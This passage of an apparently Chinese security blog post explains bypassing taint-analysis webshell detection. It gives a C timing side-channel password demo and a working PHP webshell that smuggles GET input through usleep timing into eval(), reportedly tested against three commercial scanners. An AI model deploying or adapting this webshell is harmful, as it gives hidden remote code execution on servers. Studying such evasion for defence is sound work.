+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;--&gt; failure to read line</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">delay</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="c1">//延迟函数，空白的for循环函数</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="k">volatile</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">&lt;</span><span class="mi">100</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">check_pwd</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">user</span><span class="p">)</span><span class="c1">//检测密钥是否正确</span>
+<span class="p">{</span><span class="c1">//检查的方式</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">user_len</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">secret_len</span><span class="p">)</span><span class="c1">//首先匹配长度是否一致</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="n">delay</span><span class="p">();</span><span class="c1">//延迟函数</span>
+
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">user_len</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="c1">//然后逐字检查</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">SECRET_PWD</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">        </span><span class="n">delay</span><span class="p">();</span><span class="c1">//延迟函数</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">compare</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">b</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">a</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">b</span><span class="w"> </span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">pwd</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="p">,</span><span class="w"> </span><span class="n">allowed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">tsc1</span><span class="p">,</span><span class="w"> </span><span class="n">tsc2</span><span class="p">,</span><span class="w"> </span><span class="n">med</span><span class="p">;</span>
+
+<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="n">pwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read_from_user</span><span class="p">())</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">strcmp</span><span class="p">(</span><span class="n">pwd</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;q&quot;</span><span class="p">))</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="n">user_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">pwd</span><span class="p">);</span>
+<span class="w">        </span><span class="n">secret_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">SECRET_PWD</span><span class="p">);</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">NUM_SAMPLES</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="o">++</span><span class="p">)</span><span class="c1">//10000次循环比较</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">            </span><span class="n">tsc1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rdtsc_begin</span><span class="p">();</span><span class="c1">//计时开始</span>
+<span class="w">            </span><span class="n">allowed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">check_pwd</span><span class="p">(</span><span class="n">pwd</span><span class="p">);</span>
+<span class="w">            </span><span class="n">tsc2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rdtsc_end</span><span class="p">();</span><span class="c1">//结束计时</span>
+<span class="w">            </span><span class="n">diff</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tsc2</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">tsc1</span><span class="p">;</span><span class="c1">//将结果存入diff数组</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">allowed</span><span class="p">)</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;&lt; ACCESS ALLOWED &gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">else</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;&lt; ACCESS DENIED &gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="n">qsort</span><span class="p">(</span><span class="n">diff</span><span class="p">,</span><span class="w"> </span><span class="n">NUM_SAMPLES</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">),</span><span class="w"> </span><span class="n">compare</span><span class="p">);</span><span class="c1">//将结果排序</span>
+<span class="w">        </span><span class="n">med</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">diff</span><span class="p">[</span><span class="n">NUM_SAMPLES</span><span class="o">/</span><span class="mi">2</span><span class="p">];</span><span class="c1">//输出众数</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;time (med clock cycles): %lu</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">med</span><span class="p">);</span>
+
+<span class="w">        </span><span class="n">free</span><span class="p">(</span><span class="n">pwd</span><span class="p">);</span>
+
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+首先来介绍一下rdtsc函数，rdtsc指令返回的是自开机始CPU的周期数，可以较为精准的测量时间。
+值得一提的是，侧信道还有一个很难受的点就是误差，由于计算机执行单个测量时候可能发生上下文切换或者中断，导致单个测量值并不可信，因此需要取其平均数，demo中做了10000次的测量，取其众数
+下面看看运行结果，如何猜测这个secert
+<div class="highlight"><pre><span></span><code>pw0rld@pw0rld-code<span class="w"> </span><span class="o">[</span>11时34分52秒<span class="o">]</span><span class="w"> </span>-&gt;<span class="w"> </span>%<span class="w"> </span>cat<span class="w"> </span>secret.h<span class="w"> </span>
+<span class="c1">#ifndef SECRET_H_INC</span>
+<span class="c1">#define SECRET_H_INC</span>
+
+<span class="c1">#define SECRET_PWD      &quot;524&quot;//猜测的密钥是524</span>
+<span class="c1">#define FR_SECRET       5</span>
+
+<span class="c1">#endif</span>
+pw0rld@pw0rld-code<span class="w"> </span><span class="o">[</span>11时34分56秒<span class="o">]</span><span class="w"> </span>-&gt;<span class="w"> </span>%<span class="w"> </span>./a.out<span class="w">     </span>
+Enter<span class="w"> </span>super<span class="w"> </span>secret<span class="w"> </span>password<span class="w"> </span><span class="o">(</span><span class="s1">&#39;q&#39;</span><span class="w"> </span>to<span class="w"> </span><span class="nb">exit</span><span class="o">)</span>:<span class="w"> </span><span class="m">6</span><span class="w"> </span>
+--&gt;<span class="w"> </span>You<span class="w"> </span>entered:<span class="w"> </span><span class="s1">&#39;6&#39;</span>
+&lt;<span class="w"> </span>ACCESS<span class="w"> </span>DENIED<span class="w"> </span>&gt;<span class="w">  </span>//由于上面check的流程是先检测密码的长度，我们先确定密码的位数
+<span class="nb">time</span><span class="w"> </span><span class="o">(</span>med<span class="w"> </span>clock<span class="w"> </span>cycles<span class="o">)</span>:<span class="w"> </span><span class="m">84</span>
+Enter<span class="w"> </span>super<span class="w"> </span>secret<span class="w"> </span>password<span class="w"> </span><span class="o">(</span><span class="s1">&#39;q&#39;</span><span class="w"> </span>to<span class="w"> </span><span class="nb">exit</span><span class="o">)</span>:<span class="w"> </span><span class="m">54</span>
+--&gt;<span class="w"> </span>You<span class="w"> </span>entered:<span class="w"> </span><span class="s1">&#39;54&#39;</span>
+&lt;<span class="w"> </span>ACCESS<span class="w"> </span>DENIED<span class="w"> </span>&gt;
+<span class="nb">time</span><span class="w"> </span><span class="o">(</span>med<span class="w"> </span>clock<span class="w"> </span>cycles<span class="o">)</span>:<span class="w"> </span><span class="m">84</span>
+Enter<span class="w"> </span>super<span class="w"> </span>secret<span class="w"> </span>password<span class="w"> </span><span class="o">(</span><span class="s1">&#39;q&#39;</span><span class="w"> </span>to<span class="w"> </span><span class="nb">exit</span><span class="o">)</span>:<span class="w"> </span><span class="m">123</span>
+--&gt;<span class="w"> </span>You<span class="w"> </span>entered:<span class="w"> </span><span class="s1">&#39;123&#39;</span>
+&lt;<span class="w"> </span>ACCESS<span class="w"> </span>DENIED<span class="w"> </span>&gt;
+<span class="nb">time</span><span class="w"> </span><span class="o">(</span>med<span class="w"> </span>clock<span class="w"> </span>cycles<span class="o">)</span>:<span class="w"> </span><span class="m">457</span><span class="w"> </span>//输入三位之后，明显的发现测量的time变大了
+Enter<span class="w"> </span>super<span class="w"> </span>secret<span class="w"> </span>password<span class="w"> </span><span class="o">(</span><span class="s1">&#39;q&#39;</span><span class="w"> </span>to<span class="w"> </span><span class="nb">exit</span><span class="o">)</span>:<span class="w"> </span><span class="m">543</span>
+--&gt;<span class="w"> </span>You<span class="w"> </span>entered:<span class="w"> </span><span class="s1">&#39;543&#39;</span>
+&lt;<span class="w"> </span>ACCESS<span class="w"> </span>DENIED<span class="w"> </span>&gt;
+<span class="nb">time</span><span class="w"> </span><span class="o">(</span>med<span class="w"> </span>clock<span class="w"> </span>cycles<span class="o">)</span>:<span class="w"> </span><span class="m">978</span><span class="w">  </span>//由于check是逐个比较的，第一位比较失败就不会往下比较。因此确定第一位
+Enter<span class="w"> </span>super<span class="w"> </span>secret<span class="w"> </span>password<span class="w"> </span><span class="o">(</span><span class="s1">&#39;q&#39;</span><span class="w"> </span>to<span class="w"> </span><span class="nb">exit</span><span class="o">)</span>:<span class="w"> </span><span class="m">542</span>
+--&gt;<span class="w"> </span>You<span class="w"> </span>entered:<span class="w"> </span><span class="s1">&#39;542&#39;</span>
+&lt;<span class="w"> </span>ACCESS<span class="w"> </span>DENIED<span class="w"> </span>&gt;
+<span class="nb">time</span><span class="w"> </span><span class="o">(</span>med<span class="w"> </span>clock<span class="w"> </span>cycles<span class="o">)</span>:<span class="w"> </span><span class="m">978</span>
+Enter<span class="w"> </span>super<span class="w"> </span>secret<span class="w"> </span>password<span class="w"> </span><span class="o">(</span><span class="s1">&#39;q&#39;</span><span class="w"> </span>to<span class="w"> </span><span class="nb">exit</span><span class="o">)</span>:<span class="w"> </span><span class="m">515</span>
+--&gt;<span class="w"> </span>You<span class="w"> </span>entered:<span class="w"> </span><span class="s1">&#39;515&#39;</span>
+&lt;<span class="w"> </span>ACCESS<span class="w"> </span>DENIED<span class="w"> </span>&gt;
+<span class="nb">time</span><span class="w"> </span><span class="o">(</span>med<span class="w"> </span>clock<span class="w"> </span>cycles<span class="o">)</span>:<span class="w"> </span><span class="m">976</span>
+Enter<span class="w"> </span>super<span class="w"> </span>secret<span class="w"> </span>password<span class="w"> </span><span class="o">(</span><span class="s1">&#39;q&#39;</span><span class="w"> </span>to<span class="w"> </span><span class="nb">exit</span><span class="o">)</span>:<span class="w"> </span><span class="m">521</span>
+--&gt;<span class="w"> </span>You<span class="w"> </span>entered:<span class="w"> </span><span class="s1">&#39;521&#39;</span>
+&lt;<span class="w"> </span>ACCESS<span class="w"> </span>DENIED<span class="w"> </span>&gt;
+<span class="nb">time</span><span class="w"> </span><span class="o">(</span>med<span class="w"> </span>clock<span class="w"> </span>cycles<span class="o">)</span>:<span class="w"> </span><span class="m">1367</span><span class="w">  </span>//确定第二位
+Enter<span class="w"> </span>super<span class="w"> </span>secret<span class="w"> </span>password<span class="w"> </span><span class="o">(</span><span class="s1">&#39;q&#39;</span><span class="w"> </span>to<span class="w"> </span><span class="nb">exit</span><span class="o">)</span>:<span class="w"> </span><span class="m">522</span>
+--&gt;<span class="w"> </span>You<span class="w"> </span>entered:<span class="w"> </span><span class="s1">&#39;522&#39;</span>
+&lt;<span class="w"> </span>ACCESS<span class="w"> </span>DENIED<span class="w"> </span>&gt;
+<span class="nb">time</span><span class="w"> </span><span class="o">(</span>med<span class="w"> </span>clock<span class="w"> </span>cycles<span class="o">)</span>:<span class="w"> </span><span class="m">1367</span>
+Enter<span class="w"> </span>super<span class="w"> </span>secret<span class="w"> </span>password<span class="w"> </span><span class="o">(</span><span class="s1">&#39;q&#39;</span><span class="w"> </span>to<span class="w"> </span><span class="nb">exit</span><span class="o">)</span>:<span class="w"> </span><span class="m">523</span>
+--&gt;<span class="w"> </span>You<span class="w"> </span>entered:<span class="w"> </span><span class="s1">&#39;523&#39;</span>
+&lt;<span class="w"> </span>ACCESS<span class="w"> </span>DENIED<span class="w"> </span>&gt;
+<span class="nb">time</span><span class="w"> </span><span class="o">(</span>med<span class="w"> </span>clock<span class="w"> </span>cycles<span class="o">)</span>:<span class="w"> </span><span class="m">1367</span>
+Enter<span class="w"> </span>super<span class="w"> </span>secret<span class="w"> </span>password<span class="w"> </span><span class="o">(</span><span class="s1">&#39;q&#39;</span><span class="w"> </span>to<span class="w"> </span><span class="nb">exit</span><span class="o">)</span>:<span class="w"> </span><span class="m">524</span>
+--&gt;<span class="w"> </span>You<span class="w"> </span>entered:<span class="w"> </span><span class="s1">&#39;524&#39;</span>
+&lt;<span class="w"> </span>ACCESS<span class="w"> </span>ALLOWED<span class="w"> </span>&gt;
+<span class="nb">time</span><span class="w"> </span><span class="o">(</span>med<span class="w"> </span>clock<span class="w"> </span>cycles<span class="o">)</span>:<span class="w"> </span><span class="m">1601</span><span class="w">  </span>//确定答案
+Enter<span class="w"> </span>super<span class="w"> </span>secret<span class="w"> </span>password<span class="w"> </span><span class="o">(</span><span class="s1">&#39;q&#39;</span><span class="w"> </span>to<span class="w"> </span><span class="nb">exit</span><span class="o">)</span>:
+</code></pre></div>
+可以看到，通过时间的测量，我们可以把一个三位的密钥变成三个一位密钥，大大节省了尝试的时间。
+那么大致了解了简单的侧信道知识。我们是不是可以利用这个侧信道思路恢复我们的输入。</p>
+<h4 id="microtime">microtime<a class="headerlink" href="#microtime" title="Permanent link">*</a></h4>
+<p>所以，侧信道思路就是：传入的source参数可以拆分成acsii，然后使用microtime来延时相对应的ascii时间，然后测量这个时间，通过获取程序执行的时间来恢复参数，从而得到一份干净的数据，然后送去sink
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> 
+<span class="nv">$temp</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span> <span class="c1">//source </span>
+<span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SplQueue</span><span class="p">();</span>
+<span class="nv">$time_stack</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SplQueue</span><span class="p">();</span>
+
+<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$test</span><span class="o">-&gt;</span><span class="na">enqueue</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$temp</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span><span class="c1">//获取ascii存入队列，source</span>
+<span class="p">}</span>
+<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span><span class="p">((</span><span class="nv">$test</span><span class="o">-&gt;</span><span class="na">isEmpty</span><span class="p">()))</span><span class="c1">//source</span>
+    <span class="p">{</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nv">$start</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">true</span><span class="p">);</span><span class="c1">//干净的</span>
+    <span class="nb">usleep</span><span class="p">((</span><span class="nv">$test</span><span class="o">-&gt;</span><span class="na">dequeue</span><span class="p">())</span><span class="o">*</span><span class="mi">20000</span><span class="p">);</span><span class="c1">// ascii 1毫秒   source</span>
+    <span class="c1">// $end = microtime(true); //干净的</span>
+    <span class="nv">$end</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">true</span><span class="p">);</span> <span class="c1">//干净的</span>
+
+    <span class="nv">$test</span><span class="o">-&gt;</span><span class="na">next</span><span class="p">();</span>
+    <span class="nv">$timesta</span> <span class="o">=</span> <span class="nb">ceil</span><span class="p">((</span><span class="nv">$end</span> <span class="o">-</span> <span class="nv">$start</span><span class="p">)</span><span class="o">*</span><span class="mi">1000</span><span class="p">);</span><span class="c1">//干净的</span>
+    <span class="nv">$time_stack</span><span class="o">-&gt;</span><span class="na">enqueue</span><span class="p">(</span><span class="nb">ceil</span><span class="p">((</span><span class="nv">$timesta</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span> <span class="o">/</span><span class="mi">10</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span><span class="c1">//干净的</span>
+<span class="p">}</span>
+<span class="nv">$hahh</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+<span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$time_stack</span><span class="o">-&gt;</span><span class="na">isEmpty</span><span class="p">()))</span>
+<span class="p">{</span>
+    <span class="nv">$caaaa</span> <span class="o">=</span> <span class="nv">$time_stack</span><span class="o">-&gt;</span><span class="na">dequeue</span><span class="p">();</span>
+    <span class="nv">$hahh</span> <span class="o">.=</span> <span class="nb">chr</span><span class="p">(</span><span class="nv">$caaaa</span><span class="p">);</span>
+    <span class="nv">$time_stack</span><span class="o">-&gt;</span><span class="na">next</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="k">eval</span><span class="p">(</span><span class="nv">$hahh</span><span class="p">);</span>
+  <span class="cp">?&gt;</span>
+</code></pre></div>
+值得注意的是，像我们之前说过，侧信道测量是会有误差的，所以这个sleep的时间必须多测几次，测出一个能恢复的延迟时间，在我Win本地以及Linux远程服务器，<code>usleep(($test-&gt;dequeue())*20000)</code>  这个是能恢复正确的ascii的，不排除存在极端情况无法恢复。</p>
+<h5 id="_7">测试情况<a class="headerlink" href="#_7" title="Permanent link">*</a></h5>
+<p>伏魔
+<img alt="image-20220210162819275" src="https://raw.githubusercontent.com/pw0rld/blog_image/master/image-20220210162819275.png" />
+河马查杀1.8.2
+<img alt="image-20220210162833817" src="https://raw.githubusercontent.com/pw0rld/blog_image/master/image-20220210162833817.png" />
+长亭牧云
+<img alt="image-20220210162841721" src="https://raw.githubusercontent.com/pw0rld/blog_image/master/image-20220210162841721.png" /></p>
+<h4 id="_8">内存侧信道<a class="headerlink" href="#_8" title="Permanent link">*</a></h4>
+<p>除了时间侧信道外，我还研究了一下通过内存来进行侧信道恢复，我使用了memory_get_usage()和str_repeat()这两个函数来进行测量，但是php内存是补齐的，无法区分精确到各个参数命令。
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nv">$acsii_array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+
+<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">33</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">127</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span> <span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$start</span> <span class="o">=</span>  <span class="nb">memory_get_usage</span><span class="p">();</span> <span class="c1">// 36640</span>
+    <span class="nv">$a</span> <span class="o">=</span> <span class="nb">str_repeat</span><span class="p">(</span><span class="s2">&quot;b&quot;</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span>  <span class="c1">//之间相差 32+$aa-1</span>
+    <span class="nv">$ends</span> <span class="o">=</span>  <span class="nb">memory_get_usage</span><span class="p">();</span> <span class="c1">// 57960</span>
+    <span class="nv">$k</span> <span class="o">=</span> <span class="nv">$ends</span> <span class="o">-</span> <span class="nv">$start</span> <span class="o">-</span> <span class="nv">$i</span><span class="p">;</span>
+    <span class="nv">$acsii_array</span><span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="nv">$i</span><span class="p">)]</span> <span class="o">=</span> <span class="nv">$ends</span> <span class="o">-</span> <span class="nv">$start</span><span class="p">;</span>
+    <span class="nb">unset</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nb">print_r</span><span class="p">(</span><span class="s2">&quot;</span>
+<span class="s2">&lt;pre&gt;&quot;</span><span class="p">);</span>
+<span class="nb">print_r</span><span class="p">(</span><span class="nv">$acsii_array</span><span class="p">);</span>
+</code></pre></div></p>
+<p><img alt="image-20220210162857496" src="https://raw.githubusercontent.com/pw0rld/blog_image/master/image-20220210162857496.png" /></p>
+<h2 id="_9">最后<a class="headerlink" href="#_9" title="Permanent link">*</a></h2>
+<p>随着软件分析技术的发展，DevSecOps不断推进，污点追踪从学术圈搬到工业界，它也许是抵抗入侵的一道十分有力的防御。有了这么一层强有力的防御，也要求我们攻击者要思考如何针对新的防御方法来bypass，本文中绕过污点分析，就要想方设法来让引擎把污点弄丢，从而达到绕过的目的。</p>
+<h2 id="_10">参考<a class="headerlink" href="#_10" title="Permanent link">*</a></h2>
+<ul>
+<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/5.5_taint_analysis.html">ctf-all-in-one 污点分析</a></li>
+<li><a href="https://www.softwaresecured.com/what-do-sast-dast-iast-and-rasp-mean-to-developers/">SAST, DAST, IAST and RASP</a></li>
+<li><a href="https://dongtai.io/">洞态</a></li>
+<li><a href="https://github.com/jovanbulck/sgx-tutorial-space18">side-channel-tutorial</a></li>
+<li><a href="https://www.usenix.org/conference/usenixsecurity19/presentation/jung">Fuzzification: Anti-Fuzzing Techniques</a></li>
+<li><a href="https://www.anquanke.com/post/id/264231#h2-1">pop-master</a></li>
+<li><a href="https://astexplorer.net/">ast-explorer </a></li>
+<li><a href="https://security.tencent.com/index.php/blog/msg/152">洋葱Webshell检测实践与思考</a></li>
+<li><a href="https://www.yuque.com/azeus/01/bh1rgi?spm=0.0.0.0.6PHqmO">伏魔计划</a></li>
+<li><a href="https://www.zhihu.com/question/27730062">如何使用AST生成程序的控制流图（CFG）</a></li>
+<li><a href="https://github.com/stars/pw0rld/lists/bypass-webshell">收集的GitHub相关项目</a>​</li>
+</ul>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "search.suggest", "search.highlight", "search.share", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.74e28a9f.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.220ee61c.min.js"></script>
+      
+        
+          <script src="../../js/cnzz-statistics.js"></script>
+        
+      
+        
+          <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+        
+      
+        
+          <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+        
+      
+    
+  </body>
+</html>
